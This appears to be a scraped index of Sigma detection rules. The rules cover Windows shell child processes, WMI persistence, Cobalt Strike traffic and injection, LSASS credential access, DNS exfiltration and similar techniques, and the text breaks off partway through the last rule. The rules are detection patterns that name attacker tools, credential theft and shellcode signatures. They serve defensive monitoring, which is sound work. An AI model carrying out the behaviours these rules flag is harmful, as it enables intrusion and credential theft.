Suspicious Program id: 3a6586ad-127a-4d3b-a677-1e6eacdf8fde status: test description: Detects a suspicious child process of a Windows shell author: Florian Roth, Tim Shelton references: - https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html date: 2018/04/06 modified: 2022/03/08 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: - \u0026#39;\\mshta.exe\u0026#39; - \u0026#39;\\powershell.exe\u0026#39; # - \u0026#39;*\\cmd.exe\u0026#39; # too many false positives - \u0026#39;\\rundll32.exe\u0026#39; - \u0026#39;\\cscript.exe\u0026#39; - \u0026#39;\\wscript.exe\u0026#39; - \u0026#39;\\wmiprvse.exe\u0026#39; Image|endswith: - \u0026#39;\\schtasks.exe\u0026#39; - \u0026#39;\\nslookup.exe\u0026#39; - \u0026#39;\\certutil.exe\u0026#39; - \u0026#39;\\bitsadmin.exe\u0026#39; - \u0026#39;\\mshta.exe\u0026#39; falsepositives_1: CurrentDirectory|contains: \u0026#39;\\ccmcache\\\u0026#39; falsepositives_2: ParentCommandLine|contains: # FP - Amazon Workspaces - \u0026#39;\\Program Files\\Amazon\\WorkSpacesConfig\\Scripts\\setup-scheduledtask.ps1\u0026#39; - \u0026#39;\\Program Files\\Amazon\\WorkSpacesConfig\\Scripts\\set-selfhealing.ps1\u0026#39; - \u0026#39;\\Program Files\\Amazon\\WorkSpacesConfig\\Scripts\\check-workspacehealth.ps1\u0026#39; - \u0026#39;\\nessus_\u0026#39; # Tenable/Nessus VA Scanner falsepositives_3: CommandLine|contains: \u0026#39;\\nessus_\u0026#39; # Tenable/Nessus VA Scanner condition: selection and not 1 of falsepositives* fields: - CommandLine - ParentCommandLine - CurrentDirectory - Image - ParentImage falsepositives: - Administrative scripts - Microsoft SCCM level: high tags: - attack.execution - attack.defense_evasion - attack.t1059.005 - attack.t1059.001 - attack.t1218 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_shell_spawn_susp_program.yml/","tags":["attack.execution","attack.defense_evasion","attack.t1059.005","attack.t1059.001","attack.t1218"],"title":"Windows Shell Spawning Suspicious Program"},{"categories":null,"contents":"Detects WMI script event consumers\nKnown false-positives Legitimate event consumers References https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/ Raw rule (edit) title: WMI Persistence - Script Event Consumer id: ec1d5e28-8f3b-4188-a6f8-6e8df81dc28e status: test description: Detects WMI script event consumers author: Thomas Patzke references: - https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/ date: 2018/03/07 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image: C:\\WINDOWS\\system32\\wbem\\scrcons.exe ParentImage: C:\\Windows\\System32\\svchost.exe condition: selection falsepositives: - Legitimate event consumers level: high tags: - attack.persistence - attack.privilege_escalation - attack.t1546.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_wmi_persistence_script_event_consumer.yml/","tags":["attack.persistence","attack.privilege_escalation","attack.t1546.003"],"title":"WMI Persistence - Script Event Consumer"},{"categories":null,"contents":"Detects wscript/cscript executions of scripts located in user directories\nKnown false-positives Winzip Other self-extractors Raw rule (edit) title: WScript or CScript Dropper id: cea72823-df4d-4567-950c-0b579eaf0846 status: test description: Detects wscript/cscript executions of scripts located in user directories author: Margaritis Dimitrios (idea), Florian Roth (rule), oscd.community date: 2019/01/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image|endswith: - \u0026#39;\\wscript.exe\u0026#39; - \u0026#39;\\cscript.exe\u0026#39; CommandLine|contains: - \u0026#39;C:\\Users\\\u0026#39; - \u0026#39;C:\\ProgramData\\\u0026#39; selection2: CommandLine|contains: - \u0026#39;.jse\u0026#39; - \u0026#39;.vbe\u0026#39; - \u0026#39;.js\u0026#39; - \u0026#39;.vba\u0026#39; - \u0026#39;.vbs\u0026#39; falsepositive: ParentImage|contains: \u0026#39;\\winzip\u0026#39; condition: selection1 and selection2 and not falsepositive fields: - CommandLine - ParentCommandLine falsepositives: - Winzip - Other self-extractors level: high tags: - attack.execution - attack.t1059.005 - attack.t1059.007 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_malware_script_dropper.yml/","tags":["attack.execution","attack.t1059.005","attack.t1059.007"],"title":"WScript or CScript Dropper"},{"categories":null,"contents":"Detects suspicious file execution by wscript and cscript\nKnown false-positives Will need to be tuned. I recommend adding the user profile path in CommandLine if it is getting too noisy. Raw rule (edit) title: WSF/JSE/JS/VBA/VBE File Execution id: 1e33157c-53b1-41ad-bbcc-780b80b58288 status: test description: Detects suspicious file execution by wscript and cscript author: Michael Haag date: 2019/01/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\wscript.exe\u0026#39; - \u0026#39;\\cscript.exe\u0026#39; CommandLine|contains: - \u0026#39;.jse\u0026#39; - \u0026#39;.vbe\u0026#39; - \u0026#39;.js\u0026#39; - \u0026#39;.vba\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Will need to be tuned. I recommend adding the user profile path in CommandLine if it is getting too noisy. level: medium tags: - attack.execution - attack.t1059.005 - attack.t1059.007 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_script_execution.yml/","tags":["attack.execution","attack.t1059.005","attack.t1059.007"],"title":"WSF/JSE/JS/VBA/VBE File Execution"},{"categories":null,"contents":"Detects creation of WMI event subscription persistence method\nKnown false-positives exclude legitimate (vetted) use of WMI event subscription in your network Raw rule (edit) title: WMI Event Subscription id: 0f06a3a5-6a09-413f-8743-e6cf35561297 status: test description: Detects creation of WMI event subscription persistence method author: Tom Ueltschi (@c_APT_ure) date: 2019/01/12 modified: 2021/11/27 logsource: product: windows category: wmi_event detection: selector: EventID: - 19 - 20 - 21 condition: selector falsepositives: - exclude legitimate (vetted) use of WMI event subscription in your network level: high tags: - attack.persistence - attack.t1546.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/wmi_event/sysmon_wmi_event_subscription.yml/","tags":["attack.persistence","attack.t1546.003"],"title":"WMI Event Subscription"},{"categories":null,"contents":"Detects creation or execution of UserInitMprLogonScript persistence method\nKnown false-positives exclude legitimate logon scripts penetration tests, red teaming References https://attack.mitre.org/techniques/T1037/ Raw rule (edit) title: Logon Scripts (UserInitMprLogonScript) id: 0a98a10c-685d-4ab0-bddc-b6bdd1d48458 status: test description: Detects creation or execution of UserInitMprLogonScript persistence method author: Tom Ueltschi (@c_APT_ure) references: - https://attack.mitre.org/techniques/T1037/ date: 2019/01/12 modified: 2022/02/21 logsource: category: process_creation product: windows detection: exec_selection: ParentImage|endswith: \u0026#39;\\userinit.exe\u0026#39; exec_exclusion1: Image|endswith: - \u0026#39;explorer.exe\u0026#39; - \u0026#39;\\proquota.exe\u0026#39; exec_exclusion2: CommandLine|contains: - \u0026#39;netlogon*.bat\u0026#39; - \u0026#39;UsrLogon.cmd\u0026#39; - \u0026#39;C:\\WINDOWS\\Explorer.EXE\u0026#39; create_keywords_cli: CommandLine|contains: \u0026#39;UserInitMprLogonScript\u0026#39; condition: ( exec_selection and not 1 of exec_exclusion* ) or create_keywords_cli falsepositives: - exclude legitimate logon scripts - penetration tests, red teaming level: high tags: - attack.t1037.001 - attack.persistence ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_logon_scripts_userinitmprlogonscript_proc.yml/","tags":["attack.t1037.001","attack.persistence"],"title":"Logon Scripts (UserInitMprLogonScript)"},{"categories":null,"contents":"Detects a possible remote threat creation with certain characteristics which are typical for Cobalt Strike beacons\nKnown false-positives unknown References https://medium.com/@olafhartong/cobalt-strike-remote-threads-detection-206372d11d0f https://blog.cobaltstrike.com/2018/04/09/cobalt-strike-3-11-the-snake-that-eats-its-tail/ Raw rule (edit) title: CobaltStrike Process Injection id: 6309645e-122d-4c5b-bb2b-22e4f9c2fa42 description: Detects a possible remote threat creation with certain characteristics which are typical for Cobalt Strike beacons references: - https://medium.com/@olafhartong/cobalt-strike-remote-threads-detection-206372d11d0f - https://blog.cobaltstrike.com/2018/04/09/cobalt-strike-3-11-the-snake-that-eats-its-tail/ tags: - attack.defense_evasion - attack.t1055.001 status: experimental author: Olaf Hartong, Florian Roth, Aleksey Potapov, oscd.community date: 2018/11/30 modified: 2021/11/20 logsource: product: windows category: create_remote_thread detection: selection: StartAddress|endswith: - \u0026#39;0B80\u0026#39; - \u0026#39;0C7C\u0026#39; - \u0026#39;0C88\u0026#39; condition: selection falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/create_remote_thread/sysmon_cobaltstrike_process_injection.yml/","tags":["attack.defense_evasion","attack.t1055.001"],"title":"CobaltStrike Process Injection"},{"categories":null,"contents":"This method detects malicious services mentioned in Turla PNG dropper report by NCC Group in November 2018\nKnown false-positives unlikely References https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/november/turla-png-dropper-is-back/ Raw rule (edit) title: Turla PNG Dropper Service id: 1228f8e2-7e79-4dea-b0ad-c91f1d5016c1 status: test description: This method detects malicious services mentioned in Turla PNG dropper report by NCC Group in November 2018 author: Florian Roth references: - https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/november/turla-png-dropper-is-back/ date: 2018/11/23 modified: 2021/11/30 logsource: product: windows service: system detection: selection: Provider_Name: \u0026#39;Service Control Manager\u0026#39; EventID: 7045 ServiceName: \u0026#39;WerFaultSvc\u0026#39; condition: selection falsepositives: - unlikely level: critical tags: - attack.persistence - attack.g0010 - attack.t1543.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_apt_turla_service_png.yml/","tags":["attack.persistence","attack.g0010","attack.t1543.003"],"title":"Turla PNG Dropper Service"},{"categories":null,"contents":"Detects Executables in the Downloads folder without FileVersion,Description,Product,Company likely created with py2exe\nKnown false-positives Unknown References https://securelist.com/muddywater/88059/ https://www.virustotal.com/#/file/276a765a10f98cda1a38d3a31e7483585ca3722ecad19d784441293acf1b7beb/detection Raw rule (edit) title: Suspicious File Characteristics Due to Missing Fields id: 9637e8a5-7131-4f7f-bdc7-2b05d8670c43 description: Detects Executables in the Downloads folder without FileVersion,Description,Product,Company likely created with py2exe status: experimental references: - https://securelist.com/muddywater/88059/ - https://www.virustotal.com/#/file/276a765a10f98cda1a38d3a31e7483585ca3722ecad19d784441293acf1b7beb/detection author: Markus Neis, Sander Wiebing date: 2018/11/22 modified: 2021/06/27 tags: - attack.execution - attack.t1059.006 logsource: product: windows category: process_creation detection: selection1: Description: \u0026#39;\\?\u0026#39; FileVersion: \u0026#39;\\?\u0026#39; selection2: Description: \u0026#39;\\?\u0026#39; Product: \u0026#39;\\?\u0026#39; selection3: Description: \u0026#39;\\?\u0026#39; Company: \u0026#39;\\?\u0026#39; folder: Image|contains: \u0026#39;\\Downloads\\\u0026#39; condition: (selection1 or selection2 or selection3) and folder fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_file_characteristics.yml/","tags":["attack.execution","attack.t1059.006"],"title":"Suspicious File Characteristics Due to Missing Fields"},{"categories":null,"contents":"Detects Malleable (OCSP) Profile with Typo (OSCP) in URL\nKnown false-positives Unknown References https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/ocsp.profile Raw rule (edit) title: CobaltStrike Malleable (OCSP) Profile id: 37325383-740a-403d-b1a2-b2b4ab7992e7 status: test description: Detects Malleable (OCSP) Profile with Typo (OSCP) in URL author: Markus Neis references: - https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/ocsp.profile date: 2019/11/12 modified: 2021/11/27 logsource: category: proxy detection: selection: c-uri|contains: \u0026#39;/oscp/\u0026#39; cs-host: \u0026#39;ocsp.verisign.com\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.command_and_control - attack.t1071.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_cobalt_ocsp.yml/","tags":["attack.defense_evasion","attack.command_and_control","attack.t1071.001"],"title":"CobaltStrike Malleable (OCSP) Profile"},{"categories":null,"contents":"Detects Malleable OneDrive Profile\nKnown false-positives Unknown References https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/onedrive_getonly.profile Raw rule (edit) title: CobaltStrike Malleable OneDrive Browsing Traffic Profile id: c9b33401-cc6a-4cf6-83bb-57ddcb2407fc status: test description: Detects Malleable OneDrive Profile author: Markus Neis references: - https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/onedrive_getonly.profile date: 2019/11/12 modified: 2022/01/07 logsource: category: proxy detection: selection: cs-method: \u0026#39;GET\u0026#39; c-uri|endswith: \u0026#39;?manifest=wac\u0026#39; cs-host: \u0026#39;onedrive.live.com\u0026#39; filter: c-uri|startswith: \u0026#39;http\u0026#39; c-uri|contains: \u0026#39;://onedrive.live.com/\u0026#39; condition: selection and not filter falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.command_and_control - attack.t1071.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_cobalt_onedrive.yml/","tags":["attack.defense_evasion","attack.command_and_control","attack.t1071.001"],"title":"CobaltStrike Malleable OneDrive Browsing Traffic Profile"},{"categories":null,"contents":"Detects Base64 encoded Shellcode\nKnown false-positives Unknown References https://twitter.com/cyb3rops/status/1063072865992523776 Raw rule (edit) title: PowerShell ShellCode id: 16b37b70-6fcf-4814-a092-c36bd3aafcbd status: experimental description: Detects Base64 encoded Shellcode references: - https://twitter.com/cyb3rops/status/1063072865992523776 tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1055 - attack.execution - attack.t1059.001 author: David Ledbetter (shellcode), Florian Roth (rule) date: 2018/11/17 modified: 2021/10/16 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: \u0026#39;AAAAYInlM\u0026#39; selection2: ScriptBlockText|contains: - \u0026#39;OiCAAAAYInlM\u0026#39; - \u0026#39;OiJAAAAYInlM\u0026#39; condition: selection and selection2 falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_shellcode_b64.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1055","attack.execution","attack.t1059.001"],"title":"PowerShell ShellCode"},{"categories":null,"contents":"Detects the usage of Sysinternals Tools due to accepteula key being added to Registry\nKnown false-positives Legitimate use of SysInternals tools Programs that use the same Registry Key References https://twitter.com/Moti_B/status/1008587936735035392 Raw rule (edit) title: Usage of Sysinternals Tools id: 25ffa65d-76d8-4da5-a832-3f2b0136e133 status: experimental description: Detects the usage of Sysinternals Tools due to accepteula key being added to Registry references: - https://twitter.com/Moti_B/status/1008587936735035392 date: 2017/08/28 modified: 2021/09/12 author: Markus Neis tags: - attack.resource_development - attack.t1588.002 logsource: product: windows category: registry_event detection: selection: TargetObject|endswith: \u0026#39;\\EulaAccepted\u0026#39; condition: selection falsepositives: - Legitimate use of SysInternals tools - Programs that use the same Registry Key level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_sysinternals_eula_accepted.yml/","tags":["attack.resource_development","attack.t1588.002"],"title":"Usage of Sysinternals Tools"},{"categories":null,"contents":"Detects Access to LSASS Process\nKnown false-positives Google Chrome GoogleUpdate.exe Some Taskmgr.exe related activity References https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/attack-surface-reduction-exploit-guard?WT.mc_id=twitter Raw rule (edit) title: LSASS Access Detected via Attack Surface Reduction id: a0a278fe-2c0e-4de2-ac3c-c68b08a9ba98 description: Detects Access to LSASS Process status: experimental references: - https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/attack-surface-reduction-exploit-guard?WT.mc_id=twitter author: Markus Neis date: 2018/08/26 modified: 2022/02/09 tags: - attack.credential_access # Defender Attack Surface Reduction - attack.t1003.001 logsource: product: windows service: windefend definition: \u0026#39;Requirements:Enabled Block credential stealing from the Windows local security authority subsystem (lsass.exe) from Attack Surface Reduction (GUID: 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2)\u0026#39; detection: selection: EventID: 1121 Path|endswith: \u0026#39;\\lsass.exe\u0026#39; filter_thor: ProcessName|startswith: \u0026#39;C:\\Windows\\Temp\\asgard2-agent\\\u0026#39; ProcessName|endswith: - \u0026#39;\\thor64.exe\u0026#39; - \u0026#39;\\thor.exe\u0026#39; filter_exact: ProcessName: - \u0026#39;C:\\Windows\\System32\\atiesrxx.exe\u0026#39; - \u0026#39;C:\\Windows\\System32\\CompatTelRunner.exe\u0026#39; - \u0026#39;C:\\Windows\\System32\\msiexec.exe\u0026#39; - \u0026#39;C:\\Windows\\System32\\nvwmi64.exe\u0026#39; - \u0026#39;C:\\Windows\\System32\\svchost.exe\u0026#39; - \u0026#39;C:\\Windows\\System32\\Taskmgr.exe\u0026#39; - \u0026#39;C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\u0026#39; - \u0026#39;C:\\Windows\\SysWOW64\\msiexec.exe\u0026#39; filter_begins: ProcessName|startswith: - \u0026#39;C:\\Windows\\System32\\\\DriverStore\\\u0026#39; - \u0026#39;C:\\WINDOWS\\Installer\\\u0026#39; - \u0026#39;C:\\Program Files\\\u0026#39; - \u0026#39;C:\\Program Files (x86)\\\u0026#39; condition: selection and not 1 of filter_* falsepositives: - Google Chrome GoogleUpdate.exe - Some Taskmgr.exe related activity level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/windefend/win_alert_lsass_access.yml/","tags":["attack.credential_access","attack.t1003.001"],"title":"LSASS Access Detected via Attack Surface Reduction"},{"categories":null,"contents":"Detects exploitation attempt using public exploit code for CVE-2018-15473\nKnown false-positives Unknown References https://github.com/Rhynorater/CVE-2018-15473-Exploit Raw rule (edit) title: SSHD Error Message CVE-2018-15473 id: 4c9d903d-4939-4094-ade0-3cb748f4d7da status: test description: Detects exploitation attempt using public exploit code for CVE-2018-15473 author: Florian Roth references: - https://github.com/Rhynorater/CVE-2018-15473-Exploit date: 2017/08/24 modified: 2021/11/27 logsource: product: linux service: sshd detection: keywords: - \u0026#39;error: buffer_get_ret: trying to get more bytes 1907 than in buffer 308 [preauth]\u0026#39; condition: keywords falsepositives: - Unknown level: medium tags: - attack.reconnaissance - attack.t1589 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/other/lnx_ssh_cve_2018_15473.yml/","tags":["attack.reconnaissance","attack.t1589"],"title":"SSHD Error Message CVE-2018-15473"},{"categories":null,"contents":"Detects possible SafetyKatz Behaviour\nKnown false-positives Unknown References https://github.com/GhostPack/SafetyKatz Raw rule (edit) title: Detection of SafetyKatz id: e074832a-eada-4fd7-94a1-10642b130e16 status: test description: Detects possible SafetyKatz Behaviour author: Markus Neis references: - https://github.com/GhostPack/SafetyKatz date: 2018/07/24 modified: 2021/11/27 logsource: category: file_event product: windows detection: selection: TargetFilename|endswith: \u0026#39;\\Temp\\debug.bin\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.credential_access - attack.t1003.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_ghostpack_safetykatz.yml/","tags":["attack.credential_access","attack.t1003.001"],"title":"Detection of SafetyKatz"},{"categories":null,"contents":"Detects writing data into NTFS alternate data streams from powershell. Needs Script Block Logging.\nKnown false-positives unknown References http://www.powertheshell.com/ntfsstreams/ https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md Raw rule (edit) title: NTFS Alternate Data Stream id: 8c521530-5169-495d-a199-0a3a881ad24e status: experimental description: Detects writing data into NTFS alternate data streams from powershell. Needs Script Block Logging. references: - http://www.powertheshell.com/ntfsstreams/ - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md tags: - attack.defense_evasion - attack.t1564.004 - attack.execution - attack.t1059.001 author: Sami Ruohonen date: 2018/07/24 modified: 2021/12/02 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_content: ScriptBlockText|contains: - set-content - add-content selection_stream: ScriptBlockText|contains: \u0026#39;-stream\u0026#39; condition: all of selection* falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_ntfs_ads_access.yml/","tags":["attack.defense_evasion","attack.t1564.004","attack.execution","attack.t1059.001"],"title":"NTFS Alternate Data Stream"},{"categories":null,"contents":"Detects access to a webshell dropped into a keystore folder on the WebLogic server\nKnown false-positives Unknown References https://twitter.com/pyn3rd/status/1020620932967223296 https://github.com/LandGrey/CVE-2018-2894 Raw rule (edit) title: Oracle WebLogic Exploit id: 37e8369b-43bb-4bf8-83b6-6dd43bda2000 status: experimental description: Detects access to a webshell dropped into a keystore folder on the WebLogic server author: Florian Roth date: 2018/07/22 modified: 2021/08/09 references: - https://twitter.com/pyn3rd/status/1020620932967223296 - https://github.com/LandGrey/CVE-2018-2894 logsource: category: webserver detection: selection: c-uri: \u0026#39;*/config/keystore/*.js*\u0026#39; condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: critical tags: - attack.t1190 - attack.initial_access - attack.persistence - attack.t1505.003 - cve.2018.2894 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/web/web_cve_2018_2894_weblogic_exploit.yml/","tags":["attack.t1190","attack.initial_access","attack.persistence","attack.t1505.003","cve.2018.2894"],"title":"Oracle WebLogic Exploit"},{"categories":null,"contents":"Detects various indicators of Microsoft Connection Manager Profile Installer execution\nKnown false-positives Legitimate CMSTP use (unlikely in modern enterprise environments) References https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/ Raw rule (edit) title: CMSTP Execution Process Access id: 3b4b232a-af90-427c-a22f-30b0c0837b95 status: stable description: Detects various indicators of Microsoft Connection Manager Profile Installer execution tags: - attack.defense_evasion - attack.t1218.003 - attack.execution - attack.t1559.001 - attack.g0069 - attack.g0080 - car.2019-04-001 author: Nik Seetharaman date: 2018/07/16 modified: 2021/06/27 references: - https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/ fields: - CommandLine - ParentCommandLine - Details falsepositives: - Legitimate CMSTP use (unlikely in modern enterprise environments) level: high logsource: product: windows category: process_access detection: # Process Access Call Trace selection: CallTrace|contains: \u0026#39;cmlua.dll\u0026#39; condition: selection ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_access/proc_access_win_cmstp_execution_by_access.yml/","tags":["attack.defense_evasion","attack.t1218.003","attack.execution","attack.t1559.001","attack.g0069","attack.g0080","car.2019-04-001"],"title":"CMSTP Execution Process Access"},{"categories":null,"contents":"Detects various indicators of Microsoft Connection Manager Profile Installer execution\nKnown false-positives Legitimate CMSTP use (unlikely in modern enterprise environments) References https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/ Raw rule (edit) title: CMSTP Execution Process Creation id: 7d4cdc5a-0076-40ca-aac8-f7e714570e47 status: stable description: Detects various indicators of Microsoft Connection Manager Profile Installer execution tags: - attack.defense_evasion - attack.execution - attack.t1218.003 - attack.g0069 - car.2019-04-001 author: Nik Seetharaman date: 2018/07/16 modified: 2020/12/23 references: - https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/ fields: - CommandLine - ParentCommandLine - Details falsepositives: - Legitimate CMSTP use (unlikely in modern enterprise environments) level: high logsource: category: process_creation product: windows detection: # CMSTP Spawning Child Process selection: ParentImage|endswith: \u0026#39;\\cmstp.exe\u0026#39; condition: selection ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_cmstp_execution_by_creation.yml/","tags":["attack.defense_evasion","attack.execution","attack.t1218.003","attack.g0069","car.2019-04-001"],"title":"CMSTP Execution Process Creation"},{"categories":null,"contents":"Detects various indicators of Microsoft Connection Manager Profile Installer execution\nKnown false-positives Legitimate CMSTP use (unlikely in modern enterprise environments) References https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/ Raw rule (edit) title: CMSTP Execution Registry Event id: b6d235fc-1d38-4b12-adbe-325f06728f37 status: stable description: Detects various indicators of Microsoft Connection Manager Profile Installer execution author: Nik Seetharaman date: 2018/07/16 modified: 2020/12/23 references: - https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/ fields: - CommandLine - ParentCommandLine - Details falsepositives: - Legitimate CMSTP use (unlikely in modern enterprise environments) level: high logsource: category: registry_event product: windows detection: selection: TargetObject|contains: \u0026#39;\\cmmgr32.exe\u0026#39; condition: selection tags: - attack.defense_evasion - attack.execution - attack.t1218.003 - attack.g0069 - car.2019-04-001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_cmstp_execution_by_registry.yml/","tags":["attack.defense_evasion","attack.execution","attack.t1218.003","attack.g0069","car.2019-04-001"],"title":"CMSTP Execution Registry Event"},{"categories":null,"contents":"Detects PowerShell remote thread creation in Rundll32.exe\nKnown false-positives Unknown References https://www.fireeye.com/blog/threat-research/2018/06/bring-your-own-land-novel-red-teaming-technique.html Raw rule (edit) title: PowerShell Rundll32 Remote Thread Creation id: 99b97608-3e21-4bfe-8217-2a127c396a0e status: experimental description: Detects PowerShell remote thread creation in Rundll32.exe author: Florian Roth references: - https://www.fireeye.com/blog/threat-research/2018/06/bring-your-own-land-novel-red-teaming-technique.html date: 2018/06/25 modified: 2021/11/12 logsource: product: windows category: create_remote_thread detection: selection: SourceImage|endswith: \u0026#39;\\powershell.exe\u0026#39; TargetImage|endswith: \u0026#39;\\rundll32.exe\u0026#39; condition: selection tags: - attack.defense_evasion - attack.execution - attack.t1218.011 - attack.t1059.001 falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/create_remote_thread/sysmon_susp_powershell_rundll32.yml/","tags":["attack.defense_evasion","attack.execution","attack.t1218.011","attack.t1059.001"],"title":"PowerShell Rundll32 Remote Thread Creation"},{"categories":null,"contents":"Detects the creation of a schtask via PowerSploit or Empire Default Configuration.\nKnown false-positives False positives are possible, depends on organisation and processes References https://github.com/0xdeadbeefJERKY/PowerSploit/blob/8690399ef70d2cad10213575ac67e8fa90ddf7c3/Persistence/Persistence.psm1 https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/persistence/userland/schtasks.py https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/persistence/elevated/schtasks.py Raw rule (edit) title: Default PowerSploit and Empire Schtasks Persistence id: 56c217c3-2de2-479b-990f-5c109ba8458f status: test description: Detects the creation of a schtask via PowerSploit or Empire Default Configuration. author: Markus Neis, @Karneades references: - https://github.com/0xdeadbeefJERKY/PowerSploit/blob/8690399ef70d2cad10213575ac67e8fa90ddf7c3/Persistence/Persistence.psm1 - https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/persistence/userland/schtasks.py - https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/persistence/elevated/schtasks.py date: 2018/03/06 modified: 2021/11/27 logsource: product: windows category: process_creation detection: selection1: ParentImage|endswith: \u0026#39;\\powershell.exe\u0026#39; Image|endswith: \u0026#39;\\schtasks.exe\u0026#39; CommandLine|contains|all: - \u0026#39;/Create\u0026#39; - \u0026#39;/SC\u0026#39; selection2: CommandLine|contains: - \u0026#39;ONLOGON\u0026#39; - \u0026#39;DAILY\u0026#39; - \u0026#39;ONIDLE\u0026#39; - \u0026#39;Updater\u0026#39; CommandLine|contains|all: - \u0026#39;/TN\u0026#39; - \u0026#39;Updater\u0026#39; - \u0026#39;/TR\u0026#39; - \u0026#39;powershell\u0026#39; condition: selection1 and selection2 falsepositives: - False positives are possible, depends on organisation and processes level: high tags: - attack.execution - attack.persistence - attack.privilege_escalation - attack.s0111 - attack.g0022 - attack.g0060 - car.2013-08-001 - attack.t1053.005 - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_powersploit_empire_schtasks.yml/","tags":["attack.execution","attack.persistence","attack.privilege_escalation","attack.s0111","attack.g0022","attack.g0060","car.2013-08-001","attack.t1053.005","attack.t1059.001"],"title":"Default PowerSploit and Empire Schtasks Persistence"},{"categories":null,"contents":"Detects suspicious DNS queries using base64 encoding\nKnown false-positives Unknown References https://github.com/krmaxwell/dns-exfiltration Raw rule (edit) title: Suspicious DNS Query with B64 Encoded String id: 4153a907-2451-4e4f-a578-c52bb6881432 status: experimental description: Detects suspicious DNS queries using base64 encoding author: Florian Roth date: 2018/05/10 modified: 2021/08/09 references: - https://github.com/krmaxwell/dns-exfiltration logsource: category: dns detection: selection: query|contains: \u0026#39;==.\u0026#39; condition: selection falsepositives: - Unknown level: medium tags: - attack.exfiltration - attack.t1048.003 - attack.command_and_control - attack.t1071.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/net_susp_dns_b64_queries.yml/","tags":["attack.exfiltration","attack.t1048.003","attack.command_and_control","attack.t1071.004"],"title":"Suspicious DNS Query with B64 Encoded String"},{"categories":null,"contents":"Detects suspicious DNS queries known from Cobalt Strike beacons\nKnown false-positives Unknown References https://www.icebrg.io/blog/footprints-of-fin7-tracking-actor-patterns 